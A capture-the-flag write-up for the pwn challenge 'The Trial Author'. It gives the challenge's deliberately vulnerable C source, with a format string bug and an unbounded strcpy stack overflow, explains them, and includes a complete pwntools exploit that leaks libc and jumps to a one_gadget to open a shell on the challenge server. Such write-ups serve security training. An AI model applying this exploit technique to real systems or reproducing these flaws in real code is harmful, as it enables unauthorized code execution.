### The Trial Author 🩸 | 1 Solves 1000 Points
```
The famous GREYHAT book publisher would like to give you a chance to publish your own book and make it book.

Do you have what it takes?

Author: Jin Kai
```
This challenge was blooded by my teammate `elijah5399`

`challenge.c`
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define BOOK_NAME_SIZE 0x6
#define PAGE_SIZE 0x100

char ascii_art[] =
"\e[0;31m"
"\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⣀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⠘⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠑⠀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⢻⡇⠀⠀⠀⠀⠀⠀⠀⠐⠻⠏⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⣀⡀⢠⣴⣶⣿⣿⣿⣿⣿⡆⢰⣶⠶⠶⠶⠶⠦⣤⡄⢀⣀⠀⠀⠀⠀\n"
"\t⠀⠀⠀⠀⣿⠁⣼⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣶⣶⣶⣶⣶⣿⣧⠈⣿⠀⠀⠀⠀\n"
"\t⠀⠀⠀⢠⡍⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⠛⠛⠛⠛⠛⠻⣿⡀⢻⡇⠀⠀⠀\n"
"\t⠀⠀⠀⠛⠃⣸⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⠛⠛⠛⣿⡟⠛⢻⣇⠘⣷⠀⠀⠀\n"
"\t⠀⠀⢰⡟⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⠛⠛⠛⠛⠛⠛⠛⣿⡀⢻⡄⠀⠀\n"
"\t⠀⠀⣾⡇⠘⠟⠛⠛⠉⣉⣉⣉⡉⠛⠃⠘⠛⠛⠛⠛⠛⠛⠛⠲⠿⠃⢸⣧⠀⠀\n"
"\t⠀⢀⣉⣁⣀⣀⣉⣉⣉⣉⣉⣉⣉⣉⣁⣈⣉⣉⣉⣉⣉⣉⣁⣀⣀⣀⣈⣉⡀⠀\n"
"\t⠀⠘⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀\n"
"\t  welcome to the book factory \n"
"\e[0m";

void vuln() {
	char book_name[BOOK_NAME_SIZE] = {0};
	char page_to_print[PAGE_SIZE] = {0};
	unsigned int num_pages;

	puts("if you write me a good book, i might print it for you");
	printf("book name (%u characters): ", BOOK_NAME_SIZE-1);
	size_t sz = read(0, book_name, BOOK_NAME_SIZE-1);
	if (book_name[sz-1] == '\n')
		book_name[sz-1] = 0;

	printf("how many pages (max %u): ", 10);
	scanf("%u", &num_pages);
	getchar();

	if (num_pages > 10) {
		puts("That is too many pages for this book!");
		return;
	}

	if (num_pages == 0) {
		puts("You have to write at least one page :/");
		return;
	}

	printf("\nyour book '");
	printf(book_name);
	printf("' will have %u pages. write the book!\n", num_pages);

	char** pages = calloc(num_pages, sizeof(char*));
	char* book = calloc(num_pages * PAGE_SIZE, sizeof(char));

	for (int i = 0; i < num_pages; i++) {
		pages[i] = &book[i * PAGE_SIZE];
		printf("Page %u > ", i);
		read(0, pages[i], PAGE_SIZE);
		if (pages[i][sz-1] == '\n')
			pages[i][sz-1] = 0;
	}

	unsigned int chosen_page;
	printf("\nyour book is decent. pick a page and i will print it for you (0 - %u): ", num_pages-1);
	scanf("%u", &chosen_page);
	getchar();

	if (chosen_page >= num_pages) {
		puts("Invalid page!");
		return;
	}

	strcpy(page_to_print, pages[chosen_page]); // uwu rat2libz?
	printf("\nheres your page:\n%s\n", page_to_print);
}

int main() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	puts(ascii_art);
	vuln();
}
```

In addition to this, we are also given the `libc.so.6` used to run the challenge.

`main()` calls `vuln()` once and it appears we are expected to be able to pop a shell to access the flag on the service through a single `vuln()` call. Truth be told I didn't manage to find the vulnerability until I saw `elijah5399`'s solve script, which I will also base this writeup upon.

The key idea lies in
```c
strcpy(page_to_print, pages[chosen_page]); // uwu rat2libz?
```

`page_to_print` is a character array with 256 characters, and `pages` consists of 6 character arrays each of size 256. So by right, `pages[chosen_page]` and `page_to_print` should have the same size and thus there should not be any buffer overflow.

However, looking at how `pages` is truly initialised:
```c
	char** pages = calloc(num_pages, sizeof(char*));
	char* book = calloc(num_pages * PAGE_SIZE, sizeof(char));

	for (int i = 0; i < num_pages; i++) {
		pages[i] = &book[i * PAGE_SIZE];
		printf("Page %u > ", i);
		read(0, pages[i], PAGE_SIZE);
		if (pages[i][sz-1] == '\n')
			pages[i][sz-1] = 0;
	}
```

`pages[]` mainly points to a (more or less) 600 sized buffer `book`, and `pages[i]` simply point to every 100th byte index in `book`.

Because of this, suppose my `book[]` has say, 400 `A` characters from 0 to 400. When I do `strcpy(page_to_print, pages[0])`, `pages[0]` points to the start of `book[]` and by the time it ends it would be at the 400th index. Since `strcpy()` has no size restriction unlike its secure `strcpy_s()` counterpart, all 400 bytes in `book[]` will be copied over into `page_to_print` instead!

This forms the basis for our buffer overflow. Since we have the libc, ideally we could create a onegadget that would pop a shell for us. However, ASLR results in the libc address being shifted by an unknown amount, thus we'll need to leak the base libc address somehow.

Thankfully, there is a format string vulnerability in 
```c
    puts("if you write me a good book, i might print it for you");
	printf("book name (%u characters): ", BOOK_NAME_SIZE-1);
	size_t sz = read(0, book_name, BOOK_NAME_SIZE-1);
    ...
	printf("\nyour book '");
	printf(book_name);
```

We find the appropriate offset to leak an address outside the stack frame that points to `__libc_start_main()`, and we leverage this to deduce the libc base.

We call [one_gadget](https://github.com/david942j/one_gadget) to find our gadget in the libc file to pop a shell, and then use the format string + strcpy overflow to pop a shell. And from there, we get the flag.

`exploit.py`
```py
from pwn import *

elf = context.binary = ELF("./challenge")
libc = ELF("./libs/libc.so.6")
ld = ELF("./libs/ld-linux-x86-64.so.2")

if args.REMOTE:
  p = remote("challs.nusgreyhats.org", 32931)
else:
  p = process([ld.path, elf.path], env = {"LD_PRELOAD": libc.path})

p.sendlineafter(b"characters): ", b"%49$p")
p.sendlineafter(b"10): ", b"2")
p.recvuntil(b"your book '")
libc_leak = int(p.recvuntil(b"'")[:-1].decode(),16)
libc.address = libc_leak - (0x00007fa9b84b1c87 - 0x7fa9b8490000)
print(f"libc addr: {hex(libc.address)}")

payload = 312 * b'a'
ONE_GADGET = libc.address + 0x4f29e
payload += p64(ONE_GADGET)
p.sendlineafter(b"> ", payload)
p.sendlineafter(b"(0 - 1): ", b"0")
p.interactive() # grey{strcpy_my_0ne_g4dg3t}
```
